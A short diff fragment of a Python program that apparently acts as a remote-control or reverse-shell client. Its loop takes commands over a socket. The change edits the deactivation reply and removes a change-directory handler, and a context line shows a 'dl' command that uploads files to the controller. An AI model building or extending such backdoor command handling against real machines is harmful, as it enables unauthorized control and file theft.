@@ -105,15 +105,9 @@ while True:
       data = Receive(sock).decode()
 
       if data == 'deactivate':
-        Send(sock, '🍺 Deactivated')
+        Send(sock, 'Deactivated 🍺')
         active = False
         break
-
-      elif data.startswith('cd '):
-        try:
-          os.chdir(data[3:])
-        except:
-          ret = 'Error changing directory.\n'
 
       elif data.startswith('dl '):
         ret = Upload(sock, data[3:])
